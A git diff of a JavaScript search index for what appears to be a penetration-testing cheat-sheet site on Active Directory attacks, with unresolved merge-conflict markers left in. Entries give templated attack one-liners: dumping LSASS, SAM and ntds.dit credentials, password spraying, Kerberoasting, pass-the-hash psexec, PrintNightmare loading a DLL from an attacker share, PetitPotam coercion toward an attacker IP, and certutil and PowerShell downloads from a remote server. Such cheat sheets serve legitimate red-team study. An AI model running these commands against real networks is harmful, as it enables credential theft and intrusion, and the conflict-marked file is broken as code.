@@ -1,5 +1,6 @@
 var data = [
 //CME
+<<<<<<< HEAD
 {"title":"cme - enumerate password policy","link":"/cheats/Active_directory/cme.md"},
 {"title":"cme - enumerate null session","link":"/cheats/Active_directory/cme.md   "},
 {"title":"cme - enumerate anonymous login","link":"/cheats/Active_directory/cme.md"},
@@ -83,11 +84,100 @@ var data = [
 {"title":"printerbug","link":"/cheats/Active_directory/cme.md   printerbug.py '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip&gt; &lt;attacker_ip&gt;"},
 {"title":"webclientservicescanner","link":"/cheats/Active_directory/cme.md   webclientservicescanner '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip_range&gt;"},
 {"title":"PetitPotam","link":"/cheats/Active_directory/cme.md   PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;"},
+=======
+{"title":"cme - enumerate password policy","link":"/cheats/Active_directory/cme.html"},
+{"title":"cme - enumerate null session","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - enumerate anonymous login","link":"/cheats/Active_directory/cme.html"},
+{"title":"cme - enumerate active sessions","link":"/cheats/Active_directory/cme.html"},
+{"title":"cme - enumerate domain users","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - enumerate users by bruteforce the RID","link":"/cheats/Active_directory/cme.html"},
+{"title":"cme - enumerate domain groups","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - enumerate local groups","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Enumerate permissions on all shares","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Enumerate disks on the remote target","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - enumerate smb target not signed","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - enumerate logged users","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - enable/disable the WDigest provider and dump clear-text credentials from LSA memory","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Can be useful after enable wdigest to force user to reconnect","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - local-auth","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - local-auth with hash","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - domain auth","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - kerberos auth","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Dump SAM","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Dump LSA","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - dump ntds.dit","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - dump lsass","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - dump lsass - with bloodhond update","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - password spray (user=password)","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - password spray multiple test","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - put file","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - get file","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - ASREPRoast enum without authentication","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - ASREPRoast enum with authentication","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Kerberoasting","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - Unconstrained delegation","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - winrm-auth","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - mssql password spray","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - mssql execute query","link":"/cheats/Active_directory/cme.html   "},
+{"title":"cme - mssql execute command","link":"/cheats/Active_directory/cme.html   "},
+
+//COERCER
+{"title":"coercer - list vulns","link":"/cheats/Active_directory/coercer.html   "},
+{"title":"coercer - Webdav","link":"/cheats/Active_directory/coercer.html   "},
+{"title":"coercer - List vulns many targets","link":"/cheats/Active_directory/coercer.html   "},
+
+
+//kerberos
+{"title":"Kerbrute usersenum","link":"/cheats/Active_directory/kerberos.html   "},
+{"title":"kerberos enum users","link":"/cheats/Active_directory/kerberos.html  "},
+{"title":"kerberos enum users (with user list)","link":"/cheats/Active_directory/kerberos.html   "},
+{"title":"powershell - get user SPN","link":"/cheats/Active_directory/kerberos.html   "},
+{"title":"use silver ticket","link":"/cheats/Active_directory/kerberos.html   "},
+{"title":"secret dump with kerberos","link":"/cheats/Active_directory/kerberos.html   "},
+
+//lsassy
+{"title":"Lsassy basic usage with password (ip or range)","link":"/cheats/Active_directory/lsassy.html   "},
+{"title":"Lsassy basic usage with hash (ip or range)","link":"/cheats/Active_directory/lsassy.html   "},
+{"title":"Lsassy basic usage with kerberos (ip or range)","link":"/cheats/Active_directory/lsassy.html   "},
+
+//mitm6
+{"title":"mitm6","link":"/cheats/Active_directory/mitm6.html   "},
+
+//responder
+{"title":"responder launch","link":"/cheats/Active_directory/responder.html  "},
+{"title":"responder launch - analyze mode","link":"/cheats/Active_directory/responder.html "},
+{"title":"responder launch with wpad file ","link":"/cheats/Active_directory/responder.html  "},
+{"title":"multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)","link":"/cheats/Active_directory/responder.html   "},
+{"title":"multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)","link":"/cheats/Active_directory/responder.html   "},
+{"title":"runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.","link":"/cheats/Active_directory/responder.html   "},
+{"title":"ntlmrelayx add computer","link":"/cheats/Active_directory/responder.html   "},
+
+
+//rubeus
+{"title":"inject ticket from file","link":"/cheats/Active_directory/rubeus.html "},
+{"title":"ASREPRoast specific user","link":"/cheats/Active_directory/rubeus.html "},
+{"title":"kerberoasting - current domain","link":"/cheats/Active_directory/rubeus.html "},
+{"title":"Kerberos get hash","link":"/cheats/Active_directory/rubeus.html"},
+
+//LAPS
+{"title":"get laps passwords","link":"/cheats/Active_directory/laps.html"},
+
+//Printerbug and Petitpotam
+{"title":"Finding Spooler services listening","link":"/cheats/Active_directory/cme.html "},
+{"title":"Finding Spooler services anonymous","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;dc&gt; | grep -A 6 MS-RPRN"},
+{"title":"printerbug","link":"/cheats/Active_directory/cme.html   printerbug.py '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip&gt; &lt;attacker_ip&gt;"},
+{"title":"webclientservicescanner","link":"/cheats/Active_directory/cme.html   webclientservicescanner '&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;'@&lt;ip_range&gt;"},
+{"title":"PetitPotam","link":"/cheats/Active_directory/cme.html   PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;listener&gt; &lt;target&gt;"},
+>>>>>>> c196810ae3407152d2c89d32618ea6b2baa81d1f
 {"title":"PrintNightmare: CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target_ip&gt; '\\&lt;attacker_ip&gt;\&lt;share_name&gt;\&lt;dll_name|inject&gt;.dll'"},
 {"title":"Printspoofer privesc: PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss &lt;launch_cmd&gt;"},
 
 //scshell
+<<<<<<< HEAD
 {"title":"stealty psexec","link":"/cheats/Active_directory/cme.md   python3 scshell.py -service-name &lt;service-name|defragsvc&gt; -hashes :&lt;ntlm-hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;"},
+=======
+{"title":"stealty psexec","link":"/cheats/Active_directory/cme.html   python3 scshell.py -service-name &lt;service-name|defragsvc&gt; -hashes :&lt;ntlm-hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;"},
+>>>>>>> c196810ae3407152d2c89d32618ea6b2baa81d1f
 
 //rpcclient
 {"title":"rpcclient - enumdomusers: rpcclient &lt;ip&gt; -U &quot;&lt;user&gt;%&lt;password&gt;&quot; -c &quot;enumdomusers;quit&quot;"},
@@ -99,6 +189,7 @@ var data = [
 
 
 //IMPACKET
+<<<<<<< HEAD
 {"title":"lookupsid - SID User Enumeration,  extract the information about what users exist and their data","link":"/cheats/Active_directory/cme.md   lookupsid.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
 {"title":"reg - query registry info remotely","link":"/cheats/Active_directory/cme.md   reg.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s"},
 {"title":"rpcdump - list rpc endpoint","link":"/cheats/Active_directory/cme.md   rpcdump.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
@@ -110,6 +201,19 @@ var data = [
 {"title":"GetNPUsers - (ASREPRoasting): GetNPUsers.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/ -usersfile &lt;users_file&gt; -format hashcat"},
 {"title":"GetUSERSPN","link":"/cheats/Active_directory/cme.md   GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;"},
 {"title":"GetADUser -","link":"/cheats/Active_directory/cme.md   GetADUsers.py -all &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -dc-ip &lt;dc_ip&gt;"},
+=======
+{"title":"lookupsid - SID User Enumeration,  extract the information about what users exist and their data","link":"/cheats/Active_directory/cme.html   lookupsid.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
+{"title":"reg - query registry info remotely","link":"/cheats/Active_directory/cme.html   reg.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s"},
+{"title":"rpcdump - list rpc endpoint","link":"/cheats/Active_directory/cme.html   rpcdump.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt;"},
+{"title":"services.py - (start, stop, delete, read status, config, list, create and change any service) remote","link":"/cheats/Active_directory/cme.html   services.py &lt;domain&gt;/&gt;user&gt;:&gt;password&gt;@&gt;ip&gt; &lt;action&gt;"},
+{"title":"getarch - find target architecture (64 or 32 bits)","link":"/cheats/Active_directory/cme.html   getArch.py -target &lt;ip&gt;"},
+{"title":"netview - enumeration tool (ip/shares/sessions/logged users) - need dns set","link":"/cheats/Active_directory/cme.html   netview.py &lt;domain&gt;/&gt;user&gt; -target &lt;ip&gt; -users &lt;users_file&gt;"},
+{"title":"smbclient - connect to smb on the target: smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
+{"title":"GetNPUsers without password to get TGT (ASREPRoasting): GetNPUsers.py &lt;domain&gt;/&lt;user&gt; -no-pass -request -format hashcat"},
+{"title":"GetNPUsers - (ASREPRoasting): GetNPUsers.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/ -usersfile &lt;users_file&gt; -format hashcat"},
+{"title":"GetUSERSPN","link":"/cheats/Active_directory/cme.html   GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;"},
+{"title":"GetADUser -","link":"/cheats/Active_directory/cme.html   GetADUsers.py -all &lt;domain&gt;/&lt;user&gt;:&lt;password&gt; -dc-ip &lt;dc_ip&gt;"},
+>>>>>>> c196810ae3407152d2c89d32618ea6b2baa81d1f
 {"title":"PSEXEC with username: psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;"},
 {"title":"PSEXEC with pass the Hash (pth): psexec.py -hashes &lt;hash&gt; &lt;user&gt;@&lt;ip&gt;"},
 {"title":"PSEXEC with kerberos: export KRB5CCNAME=&lt;ccache_file&gt;; psexec.py -dc-ip &lt;dc_ip&gt; -target-ip &lt;ip&gt;&gt; -no-pass -k &lt;domain&gt;/&lt;user&gt;@&lt;target_name&gt;"},
@@ -146,7 +250,11 @@ var data = [
 //Download
 {"title":"download with certutil: certutil.exe -urlcache -split -f http://&lt;server&gt;/&lt;source_file&gt; &lt;dest_file&gt;"},
 {"title":"download with  certutil (2): certutil.exe -verifyctl -f -split h http://&lt;server&gt;/&lt;source_file&gt; &lt;dest_file&gt;"},
+<<<<<<< HEAD
 {"title":"Encode in base64 with certutil","link":"/cheats/Active_directory/cme.md   certutil -decode enc.txt &lt;file&gt;"},
+=======
+{"title":"Encode in base64 with certutil","link":"/cheats/Active_directory/cme.html   certutil -decode enc.txt &lt;file&gt;"},
+>>>>>>> c196810ae3407152d2c89d32618ea6b2baa81d1f
 {"title":"Download with powershell"},
 {"title":"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://&lt;server&gt;/&lt;source_file&gt;','&lt;dest_file&gt;')"},
 {"title":"python Simple HTTP server: python -m SimpleHTTPServer &lt;lport&gt;"},
